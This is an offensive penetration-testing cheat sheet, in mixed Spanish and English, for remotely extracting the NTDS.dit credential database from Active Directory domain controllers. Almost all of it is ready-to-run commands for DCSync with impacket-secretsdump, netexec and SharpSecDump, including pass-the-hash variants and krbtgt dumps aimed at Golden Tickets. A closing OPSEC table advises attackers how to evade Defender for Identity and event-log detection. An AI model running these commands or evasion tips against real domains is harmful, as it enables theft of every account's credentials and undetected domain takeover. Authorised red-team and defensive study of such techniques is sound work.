---
aliases:
  - NTDS Remote
  - secretsdump DA
  - DCSync Remote
tags:
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NTDS.dit Extraction]]"
---
# NTDS.dit Extraction - Remote Extraction

---

## impacket-secretsdump Live (DCSync)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump domain/admin:password@DC` | Full NTDS — NT hashes, Kerberos keys, history | Standard DA post-exploit. |
| `impacket-secretsdump domain/admin:password@DC -just-dc` | Solo NTDS.dit (skip SAM/LSA) | Enfocado en AD. |
| `impacket-secretsdump domain/admin:password@DC -just-dc-ntlm` | Solo NT hashes (sin AES keys) | PtH prep, output chico. |
| `impacket-secretsdump domain/admin:password@DC -just-dc-user krbtgt` | krbtgt hash solamente | Golden Ticket prep. |
| `impacket-secretsdump domain/admin:password@DC -just-dc-user administrator` | Built-in admin hash | Pivoting directo. |
| `impacket-secretsdump domain/admin:password@DC -outputfile hashes` | Output en archivos `hashes.ntds` etc. | Pipeline a hashcat. |
^ntds-remote-secretsdump

```bash
# Full dump
impacket-secretsdump corp.local/administrator:P@ssw0rd@dc01.corp.local

# Solo NT hashes, output a file
impacket-secretsdump corp.local/administrator:P@ssw0rd@dc01.corp.local \
  -just-dc-ntlm -outputfile dc_hashes

# Solo krbtgt para Golden Ticket
impacket-secretsdump corp.local/administrator:P@ssw0rd@dc01.corp.local \
  -just-dc-user krbtgt
```

---

## nxc / netexec --ntds

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u admin -p pass --ntds` | Full NT hashes domain | Preferred tool. |
| `nxc smb <DC> -u admin -H NTHASH --ntds` | Full dump via PtH | Con hash, sin password. |
| `nxc smb <DC> -u admin -p pass --ntds --users` | Hashes + user info (enabled, badPwd, etc.) | Con metadata. |
| `nxc smb <DC> -u admin -p pass --ntds drsuapi` | Force DCSync method | Explícito. |
| `nxc smb <DC> -u admin -p pass --ntds vss` | Force VSS method | Alternativo si DCSync bloqueado. |
| `nxc smb <DC> -u admin -p pass --ntds --enabled` | Solo users habilitados | Skip disabled accounts. |
^ntds-remote-nxc

```bash
# Standard
nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds

# Con hash (PtH)
nxc smb dc01.corp.local -u administrator -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 --ntds

# Output en nxc log: ~/.nxc/logs/
```

---

## secretsdump con Pass-the-Hash

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump -hashes :NTHASH domain/admin@DC` | Full NTDS via PtH | Admin hash sin password. |
| `impacket-secretsdump -hashes LMHASH:NTHASH domain/admin@DC` | Full NTDS | Con LM:NT (LM puede ser vacío). |
| `impacket-secretsdump -hashes :NTHASH domain/admin@DC -just-dc-ntlm` | Solo NT hashes | Rápido. |
^ntds-remote-pth

```bash
# LM hash puede ser vacío (aad3b435b51404eeaad3b435b51404ee)
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 \
  corp.local/administrator@dc01.corp.local -just-dc-ntlm
```

---

## SharpSecDump (.NET Remote)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=domain` | NT hashes + LSA secrets | C# alternative desde Windows. |
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=domain -sam` | Solo SAM local del DC | Local hashes. |
^ntds-remote-sharpsec

```powershell
# Ejecutar desde Windows con DA creds
.\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p=P@ssw0rd -d=corp.local
```

---

## Requirements

| **Requisito** | **Detalle** | **Check** |
|:---:|:---:|:---:|
| Privilegio | DA o cuenta con DCSync ACE (`GetChangesAll` GUID) | `(Get-Acl "AD:$((Get-ADDomain).DistinguishedName)").Access` |
| Conectividad | Port 445 (SMB) + 135 (RPC) al DC | `nxc smb dc01` |
| Resolución DNS | DC por FQDN, no IP | `/etc/hosts` o DNS configurado |
| Auth válida | Password o NT hash | `nxc smb dc01 -u admin -p pass` |
^ntds-remote-req

```bash
# Verificar conectividad antes
nxc smb dc01.corp.local -u admin -p pass
# Output: SMB 10.10.10.1 445 DC01 [+] corp.local\admin:pass (Pwn3d!)
```

---

## OPSEC

| **Consideración** | **Detalle** | **Mitigación atacante** |
|:---:|:---:|:---:|
| DCSync genera Event 4662 | ObjectType GUIDs de replication en domain root | Difícil evadir en DC con MDI |
| MDI detecta DCSync pattern | Análisis de tráfico DRSUAPI | Usar VSS method si MDI activo |
| secretsdump deja artifact? | No persistent artifact — todo en red/memoria | Solo network traffic |
| nxc `--ntds vss` | Crea VSS snapshot remoto — más ruido en VSS logs | Preferir drsuapi si permitido |
| Timing | Durante business hours = blend con replication normal | Off-hours más sospechoso si no hay DCs activos |
^ntds-remote-opsec

---
